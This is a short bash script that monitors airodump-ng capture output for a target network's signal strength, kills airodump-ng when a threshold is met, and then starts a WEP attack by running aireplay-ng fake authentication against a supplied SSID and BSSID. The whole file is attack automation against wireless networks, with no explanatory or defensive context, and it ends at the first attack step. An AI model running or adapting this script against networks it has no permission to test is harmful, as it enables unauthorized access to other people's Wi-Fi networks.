#!/bin/bash

sleep 5

SSID="$1"

while true; do
	PWR=$(tac capFiles/air_output.txt | grep $SSID | head -1 | awk -F' ' '{print $2}')
	echo $PWR
	sleep .2
	if (($PWR >= $2)); then
		echo "[*] Threshold reached, killing airodump-ng"
		sudo kill -9 $(ps -aux | grep -v grep | grep -v sudo | grep -m1 airodump | awk -F' ' '{print $2}')
		sleep 5
		clear
		echo "[*] Launching attack on network"
		break
	fi
done

#Launch WEP attack

wlanMAC="$(cat /sys/class/net/wlan1mon/address)"
BSSID="$3"
CHANNEL="$4"

aireplay-ng -1 0 -e $SSID -a $BSSID -h $wlanMAC wlan1mon


